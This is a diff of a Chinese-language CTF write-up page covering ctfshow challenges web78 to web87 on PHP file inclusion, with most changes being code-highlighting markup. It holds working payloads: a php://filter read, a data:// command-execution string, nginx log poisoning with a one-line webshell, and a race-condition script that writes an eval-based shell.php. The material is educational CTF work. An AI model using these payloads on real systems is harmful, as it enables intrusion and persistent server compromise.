@@ -30,7 +30,7 @@ document.addEventListener("pjax:success", initScrollReveal);
   const setting = localStorage.getItem('darken-mode') || 'auto'
   if (setting === 'dark' || (prefersDark && setting !== 'light'))
     document.documentElement.classList.toggle('dark', true)
-})()</script><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
 IconifyProviders = {
   // Empty prefix: overwrite default API provider configuration
   '': {
@@ -56,17 +56,17 @@ IconifyProviders = {
 </blockquote>
 <h3 id="web78-117"><a href="#web78-117" class="headerlink" title="web78-117"></a>web78-117</h3><h4 id="web78-php"><a href="#web78-php" class="headerlink" title="web78(php)"></a>web78(php)</h4><p>签到</p>
 <p>Payload: <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
-<h4 id="web79-data"><a href="#web79-data" class="headerlink" title="web79(data)"></a>web79(data)</h4><pre class="language-php" data-language="php"><code class="language-php">$file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file); </code></pre>
+<h4 id="web79-data"><a href="#web79-data" class="headerlink" title="web79(data)"></a>web79(data)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre>
 
 <p>将php过滤，可以考虑data</p>
 <p>Payload:</p>
 <blockquote>
-<pre class="language-php" data-language="php"><code class="language-php">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;
+<pre class="language-php" data-language="php"><code class="language-php">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
 
-PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs &#x3D;&#x3D;&#x3D;&gt; &lt;?php system(&#39;cat flag.php&#39;);</code></pre>
+PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
 </blockquote>
-<h4 id="web80-nginx日志注入"><a href="#web80-nginx日志注入" class="headerlink" title="web80(nginx日志注入)"></a>web80(nginx日志注入)</h4><pre class="language-php" data-language="php"><code class="language-php">$file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
-$file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file); </code></pre>
+<h4 id="web80-nginx日志注入"><a href="#web80-nginx日志注入" class="headerlink" title="web80(nginx日志注入)"></a>web80(nginx日志注入)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre>
 
 <p>data也被ban了</p>
 <p>使用nginx日志文件包含，在User-Agent写入一句话木马，使用蚁剑连接<a target="_blank" rel="noopener" href="https://xxx.ctfshow/?file=/var/log/nginx">https://xxx.ctfshow?file=/var/log/nginx</a>  getshell</p>
@@ -78,16 +78,16 @@ $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file); </code></pre
 <p>看题解也可以大小写绕过用PHP:&#x2F;&#x2F;input</p>
 <h4 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h4><p>多过滤了冒号，所以依旧可以nginx日志注入</p>
 <h4 id="web82-利用session-upload-progress进行文件包含"><a href="#web82-利用session-upload-progress进行文件包含" class="headerlink" title="web82(利用session.upload_progress进行文件包含)"></a>web82(利用session.upload_progress进行文件包含)</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a></p>
-<pre class="language-php" data-language="php"><code class="language-php">if(isset($_GET[&#39;file&#39;]))&#123;
-    $file &#x3D; $_GET[&#39;file&#39;];
-    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
-    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
-    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);
-    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);
-    include($file);
-&#125;else&#123;
-    highlight_file(__FILE__);
-&#125;</code></pre>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
 
 <p>如果session.auto_start&#x3D;On ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID&#x3D;TGAO，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
 <p>但是问题来了，默认配置session.upload_progress.cleanup &#x3D; on导致文件上传后，session文件内容立即清空，</p>
@@ -114,40 +114,40 @@ $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file); </code></pre
 <p>最后竞争得到flag</p>
 <p><strong>方法二</strong>:</p>
 <p>可以利用脚本进行条件竞争</p>
-<pre class="language-python" data-language="python"><code class="language-python">import io
-import sys
-import requests
-import threading
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> threading
 
-sessid &#x3D; &#39;Qftm&#39;
-url &#x3D; &#39;https:&#x2F;&#x2F;2fdf78b8-ded3-49bb-8ebc-1bc7fac6b480.challenge.ctf.show&#x2F;&#39;
+sessid <span class="token operator">=</span> <span class="token string">'Qftm'</span>
+url <span class="token operator">=</span> <span class="token string">'https://2fdf78b8-ded3-49bb-8ebc-1bc7fac6b480.challenge.ctf.show/'</span>
 
-def POST(session):
-    while True:
-        f &#x3D; io.BytesIO(b&#39;a&#39; * 1024 * 50)
-        session.post(
-            url,
-            data&#x3D;&#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php system(&#39;cat *&#39;);fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[mtfQ])?&gt;&#39;);?&gt;&quot;&#125;,
-            files&#x3D;&#123;&quot;file&quot;:(&#39;q.txt&#39;, f)&#125;,
-            cookies&#x3D;&#123;&#39;PHPSESSID&#39;:sessid&#125;
-        )
+<span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>
+        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
+            url<span class="token punctuation">,</span>
+            data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span><span class="token string">"&lt;?php system('cat *');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[mtfQ])?>');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'q.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span>sessid<span class="token punctuation">&#125;</span>
+        <span class="token punctuation">)</span>
 
-def READ(session):
-    while True:
-        response &#x3D; session.get(f&#39;&#123;url&#125;?file&#x3D;&#x2F;tmp&#x2F;sess_&#123;sessid&#125;&#39;)
-        if &#39;flag&#39; not in response.text:
-            print(&#39;[+++]retry&#39;)
-        else:
-            print(response.text)
-            sys.exit(0)
+<span class="token keyword">def</span> <span class="token function">READ</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">?file=/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sessid<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
 
 
-with requests.session() as session:
-    t1 &#x3D; threading.Thread(target&#x3D;POST, args&#x3D;(session, ))
-    t1.daemon &#x3D; True
-    t1.start()
+<span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>
+    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>POST<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>
+    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>
+    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-    READ(session)
+    READ<span class="token punctuation">(</span>session<span class="token punctuation">)</span>
 
 </code></pre>
 
@@ -158,14 +158,14 @@ with requests.session() as session:
 <h4 id="web85"><a href="#web85" class="headerlink" title="web85"></a>web85</h4><p>添加了一个内容识别，如果有<code>&lt;</code>就die，依旧可以竞争。</p>
 <h4 id="web86"><a href="#web86" class="headerlink" title="web86"></a>web86</h4><p>dirname(<strong>FILE</strong>)表示当前文件的绝对路径。set_include_path函数,是用来设置include的路径的，就是include()可以不提供文件的完整路径了。<br>include文件时,当包含路径既不是相对路径，也不是绝对路径时(如:include(“test.php”))，会先查找include_path所设置的目录。<br>脚本里用的是完整路径，不影响竞争。</p>
 <h4 id="web87-file-put-contents"><a href="#web87-file-put-contents" class="headerlink" title="web87(file_put_contents)"></a>web87(file_put_contents)</h4><pre class="language-php" data-language="php"><code class="language-php">
-if(isset($_GET[&#39;file&#39;]))&#123;
-    $file &#x3D; $_GET[&#39;file&#39;];
-    $content &#x3D; $_POST[&#39;content&#39;];
-    $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);
-    $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);
-    $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);
-    $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);
-    file_put_contents(urldecode($file), &quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;.$content);
+if(isset($_GET['file']))&#123;
+    $file = $_GET['file'];
+    $content = $_POST['content'];
+    $file = str_replace("php", "???", $file);
+    $file = str_replace("data", "???", $file);
+    $file = str_replace(":", "???", $file);
+    $file = str_replace(".", "???", $file);
+    file_put_contents(urldecode($file), "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'大佬别秀了'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>".$content);
 &#125;</code></pre>
 
 <p>file_put_contents() 函数把一个字符串写入文件中。</p>
@@ -174,28 +174,28 @@ if(isset($_GET[&#39;file&#39;]))&#123;
 <p>参考大佬文章，可以使用base64或者rot13来进行对前面代码进行杂糅</p>
 <p>首先构造$file，因为要对file进行一次url解码所以我们对payload进行两次url编码</p>
 <p>晚上大多工具是对英文字符不进行url编码的，所以这里给出脚本方便进行urlencode</p>
-<pre class="language-python" data-language="python"><code class="language-python">import urllib.parse
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
 
 
-def encode_char(char):
-    # 指定字符集，转换为ASCII码后，再转换为16进制，并添加%
-    special_chars &#x3D; &quot;!#$&amp;&#39;()*+,&#x2F;:;&#x3D;?@-._~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
-    if char in special_chars:
-        # 转换为ASCII码，然后转换为16进制，并添加%
-        return &#39;%&#123;:02x&#125;&#39;.format(ord(char))
-    else:
-        # 对其他字符进行URL编码
-        return urllib.parse.quote(char)
+<span class="token keyword">def</span> <span class="token function">encode_char</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 指定字符集，转换为ASCII码后，再转换为16进制，并添加%</span>
+    special_chars <span class="token operator">=</span> <span class="token string">"!#$&amp;'()*+,/:;=?@-._~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
+    <span class="token keyword">if</span> char <span class="token keyword">in</span> special_chars<span class="token punctuation">:</span>
+        <span class="token comment"># 转换为ASCII码，然后转换为16进制，并添加%</span>
+        <span class="token keyword">return</span> <span class="token string">'%&#123;:02x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token comment"># 对其他字符进行URL编码</span>
+        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>char<span class="token punctuation">)</span>
 
 
-def url_encode(input_string):
-    # 对字符串中的每个字符进行编码
-    return &#39;&#39;.join(encode_char(char) for char in input_string)
+<span class="token keyword">def</span> <span class="token function">url_encode</span><span class="token punctuation">(</span>input_string<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 对字符串中的每个字符进行编码</span>
+    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>encode_char<span class="token punctuation">(</span>char<span class="token punctuation">)</span> <span class="token keyword">for</span> char <span class="token keyword">in</span> input_string<span class="token punctuation">)</span>
 
 
-input_string &#x3D; &quot;Test&quot;
-encoded_string &#x3D; url_encode(input_string)
-print(encoded_string)
+input_string <span class="token operator">=</span> <span class="token string">"Test"</span>
+encoded_string <span class="token operator">=</span> url_encode<span class="token punctuation">(</span>input_string<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>encoded_string<span class="token punctuation">)</span>
 </code></pre>
 
 <blockquote>
